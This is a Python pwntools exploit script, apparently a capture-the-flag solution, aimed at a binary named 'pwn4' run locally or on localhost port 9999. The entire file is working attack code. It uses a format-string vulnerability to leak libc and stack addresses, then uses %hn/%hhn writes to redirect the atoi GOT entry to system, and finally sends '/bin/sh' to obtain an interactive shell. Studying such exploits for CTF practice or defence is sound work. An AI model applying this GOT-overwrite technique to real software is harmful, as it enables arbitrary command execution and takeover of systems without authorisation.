#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./pwn4")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./pwn4")
    libc = elf.libc
    main_arena = 0x1b3780

else:
    io = remote("localhost", 9999)
    libc = ELF("./libc.so.6.32")
    main_arena = 0x1b0780

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def delete(idx):
    io.sendlineafter("exit\n", "3")
    io.sendlineafter("delete?\n", str(idx))

def fsb(payload):
    io.sendlineafter("exit\n", "1")
    io.sendlineafter("Kerrigan\n", "2")
    io.sendlineafter(": ", '00000000' + payload)
    #  DEBUG("b *0x8048899\nc")
    delete(0)
    io.sendlineafter("exit\n", "1")
    io.sendlineafter("Kerrigan\n", "1")
    io.sendlineafter(": ", "M4x")
    io.sendlineafter("StimPack\n", "3")
    #  DEBUG("b *0x804884C\nc")
    io.sendlineafter("exit\n", "2")
    
if __name__ == "__main__":
    fsb("||%{}$p||\0".format(0xae - 0x3 + 1))
    libc.address = u32(io.recvuntil("\xf7")[-4: ]) - 48 - main_arena
    success("libc.address", libc.address)
    io.recvuntil("||")
    stack = int(io.recvuntil("||", drop = True), 16) - 0x338
    success("stack", stack)
    pause()
    delete(0)

    #  DEBUG("b *0x804884C\nc")
    fsb("%{}c%{}$hn%{}c%{}$hn\0".format(((stack + 0x3bc) & 0xffff) - 8, 0xdd - 0x3 + 1, 0x30, 0xde - 0x3 + 1))
    delete(0)

    #  DEBUG("b *0x804884C\nc")
    fsb("%{}c%{}$hn%{}c%{}$hn\0".format((elf.got['atoi'] & 0xffff) - 8, 0x101 - 0x3 + 1, 2, 0x103 - 0x3 + 1))
    delete(0)

    #  DEBUG("b *0x804884C\nc")
    fsb("%{}c%{}$hhn%{}c%{}$hn\0".format((libc.sym['system'] >> 16 & 0xff) - 8, 0xfb - 0x3 + 1, (libc.sym['system'] & 0xffff) - (((libc.sym['system'] >> 16) & 0xff) - 8) - 8, 0xef - 0x3 + 1))
    
    io.sendlineafter("exit\n", "/bin/sh\0")

    io.interactive()
    io.close()



